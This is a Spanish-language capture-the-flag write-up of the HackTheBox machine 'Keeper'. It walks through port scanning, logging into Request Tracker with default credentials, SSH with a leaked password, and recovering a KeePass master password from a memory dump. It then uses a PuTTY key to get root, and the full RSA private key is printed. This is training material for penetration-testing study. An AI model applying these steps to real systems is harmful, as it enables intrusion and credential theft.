---
title: Keeper
os: Linux
published: 2026-06-17
tags: [Abusing Request Tracker, Information Leakage, KeePass, eJPT,]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Abusing Request Tracker
- Information Leakage
- Obtaining KeePass password through memory dump [Privilege Escalation]

### Preparación

- eJPT

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.41 -oG nmap/allPorts 
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora con la función **extractPorts** (*Función de S4vitar*), extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash
nmap -sVC -p22,80 10.129.229.41 -oN nmap/targeted
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Puerto 80  

![Puerto 80](./1.png)

Si le damos click al hipervínculo, nos lleva a `http://tickets.keeper.htb/rt/` (*Debemos a añadir los dominios al /etc/hosts*):

## tickets.keeper.htb

![tickets.keeper.htb](./2.png)

Si buscamos la contraseña por defecto del servicio **Request Tracker** encontramos [esto](https://rt-wiki.bestpractical.com/index.php?title=RecoverRootPassword), es `root:password`:

![Login](./3.png)

Buscando un poco por el dashboard, encontramos un usuario: 

![User Lise Nørgaard](./4.png)

![Password](./5.png)

Obtenemos las credenciales: `lnorgaard:Welcome2023!` aprovechando que tenemos **SSH** abierto intentaremos conectarnos:

```bash
❯ ssh lnorgaard@10.129.229.41
The authenticity of host '10.129.229.41 (10.129.229.41)' can't be established.
ED25519 key fingerprint is: SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.41' (ED25519) to the list of known hosts.
lnorgaard@10.129.229.41's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ whoami
lnorgaard
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ cat user.txt 
fbe572eadd433543...
```

# Escalada de privilegios

## Keepass Memory Dump

Vemos un zip raro en home llamado `RT30000.zip`, nos lo vamos a transferir mediante `scp` o **Secure Copy Protocol**:

```bash
❯ scp lnorgaard@10.129.229.41:/home/lnorgaard/RT30000.zip .
lnorgaard@10.129.229.41's password: 
RT30000.zip                                                                                                                                                                                                           100%   83MB   2.3MB/s   00:35    
❯ ls
 RT30000.zip
❯ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
❯ ls
 KeePassDumpFull.dmp   passcodes.kdbx   RT30000.zip
```

Buscando un poco al respecto, sobretodo de `KeePassDumpFull.dmp`, encontramos un [dumper](https://github.com/z-jxy/keepass_dump) que supuestamente extrae la contraseña maestra de este dump. Básicamente busca en los logs cuando la contraseña fue escrita y en base al último carácter la descifra tal que así:

```bash
❯ python3 keepass_dump.py -f ../KeePassDumpFull.dmp --skip --debug --recover

[*] Skipping bytes
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 12358616 | Found: ●●d
[*] 12359636 | Found: ●●d
[*] 12361106 | Found: ●●●g
[*] 12362154 | Found: ●●●g
[*] 12363716 | Found: ●●●●r
[*] 12364772 | Found: ●●●●r
[*] 12381216 | Found: ●●●●●●d
[*] 12382320 | Found: ●●●●●●d
[*] 12384154 | Found: ●●●●●●● 
[*] 12385298 | Found: ●●●●●●● 
[*] 12387028 | Found: ●●●●●●●●m
[*] 12388180 | Found: ●●●●●●●●m
[*] 12389814 | Found: ●●●●●●●●●e
[*] 12390826 | Found: ●●●●●●e
[*] 12392688 | Found: ●●●●●●●●●●d
[*] 12393848 | Found: ●●●●●●●●●●d
[*] 12395850 | Found: ●●●●●●●●●●● 
[*] 12396878 | Found: ●●●●●●●●●●● 
[*] 12398908 | Found: ●●●●●●●●●●●●f
[*] 12399944 | Found: ●●●●●●●●●●●●f
[*] 12402046 | Found: ●●●●●●●●●●●●●l
[*] 12403090 | Found: ●●●●●●●●●●●●●l
[*] 12420202 | Found: ●●●●●●●●●●●●●●●d
[*] 12421266 | Found: ●●●●●●●●●●●●●●●d
[*] 12423388 | Found: ●●●●●●●●●●●●●●●●e
[*] 12424460 | Found: ●●●●●●●●●●●●●●●●e
[*] 10000000 bytes since last found. Ending scan.
[*] 0:	{UNKNOWN}
[*] 2:	d
[*] 3:	g
[*] 4:	r
[*] 6:	<{d, e}>
[*] 7:	
[*] 8:	m
[*] 9:	e
[*] 10:	d
[*] 11:	
[*] 12:	f
[*] 13:	l
[*] 15:	d
[*] 16:	e
[*] Extracted: {UNKNOWN}dgr<{d, e}> med flde
[?] Recovering...
[-] Couldn't verify plaintext match in dump for: dgrd med flde
[?] Recovering...
[-] Couldn't verify plaintext match in dump for: dgre med flde
```

No está completa, pero si buscamos `dgrd med flde` en google encontramos un plato danés llamado `rødgrød med fløde` que coincide con los carácteres especiales. Si la probamos:

![Keepass](./6.png)

Podemos ver que funciona y para el usuario `root` encontramos una key de putty que podemos transformar a un `id_rsa` de la siguiente manera:

```bash
❯ puttygen key.ppk -O private-openssh -o id_rsa
❯ ls
 keepass_dump  󰷖 id_rsa   KeePassDumpFull.dmp   key.ppk   passcodes.kdbx   RT30000.zip
❯ cat id_rsa
─────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: id_rsa
─────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ -----BEGIN RSA PRIVATE KEY-----
   2 │ MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
   3 │ c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
   4 │ Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
   5 │ FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
   6 │ MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p
   7 │ 5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF
   8 │ NdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6joDni1wZdo7hTpJ5Zjdmz
   9 │ wxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCihkmyZTZOV9eq1D6P1uB6A
  10 │ XSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputYf7n24kvL0WlBQThsiLkK
  11 │ cz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzTVkCew1DZuYnYOGQxHYW6
  12 │ WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivzUXjcCAviPpmSXB19UG8J
  13 │ lTpgORyhAoGBAPaR+FID78BKtzThkhVqAKB7VCryJaw7Ebx6gIxbwOGFu8vpgoB8
  14 │ S+PfF5qFd7GVXBQ5wNc7tOLRBJXaxTDsTvVy+X8TEbOKfqrKndHjIBpXs+Iy0tOA
  15 │ GSqzgADetwlmklvTUBkHxMEr3VAhkY6zCLf+5ishnWtKwY3UVsr+Z4f1AoGBAK28
  16 │ /Glmp7Kj7RPumHvDatxtkdT2Iaecl6cYhPPS/OzSFdPcoEOwHnPgtuEzspIsMj2j
  17 │ gZZjHvjcmsbLP4HO6PU5xzTxSeYkcol2oE+BNlhBGsR4b9Tw3UqxPLQfVfKMdZMQ
  18 │ a8QL2CGYHHh0Ra8D6xfNtz3jViwtgTcBCHdBu+lZAoGAcj4NvQpf4kt7+T9ubQeR
  19 │ RMn/pGpPdC5mOFrWBrJYeuV4rrEBq0Br9SefixO98oTOhfyAUfkzBUhtBHW5mcJT
  20 │ jzv3R55xPCu2JrH8T4wZirsJ+IstzZrzjipe64hFbFCfDXaqDP7hddM6Fm+HPoPL
  21 │ TV0IDgHkKxsW9PzmPeWD2KUCgYAt2VTHP/b7drUm8G0/JAf8WdIFYFrrT7DZwOe9
  22 │ LK3glWR7P5rvofe3XtMERU9XseAkUhTtqgTPafBSi+qbiA4EQRYoC5ET8gRj8HFH
  23 │ 6fJ8gdndhWcFy/aqMnGxmx9kXdrdT5UQ7ItB+lFxHEYTdLZC1uAHrgncqLmT2Wrx
  24 │ heBgKQKBgFViaJLLoCTqL7QNuwWpnezUT7yGuHbDGkHl3JFYdff0xfKGTA7iaIhs
  25 │ qun2gwBfWeznoZaNULe6Khq/HFS2zk/Gi6qm3GsfZ0ihOu5+yOc636Bspy82JHd3
  26 │ BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
  27 │ -----END RSA PRIVATE KEY-----
─────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.129.229.41
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# whoami
root
root@keeper:~# cat /root/root.txt
42dd81cabd142c16e...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/556)

---